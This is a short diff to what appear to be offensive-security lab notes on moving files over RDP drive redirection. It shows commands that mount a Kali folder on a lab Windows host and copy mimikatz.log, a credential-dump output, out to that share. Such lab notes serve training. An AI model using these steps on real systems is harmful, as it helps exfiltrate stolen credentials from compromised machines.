@@ -29,7 +29,7 @@ offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents
 ```
 
 windows:
-```powershell
+```
 copy mimikatz.log \\tsclient\test\mimikatz.log
 ```
 
@@ -41,7 +41,7 @@ rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Doc
 ```
 
 on windows:
-```powershell
+```
 copy mimikatz.log \\tsclient\test\mimikatz.log
 ```
 
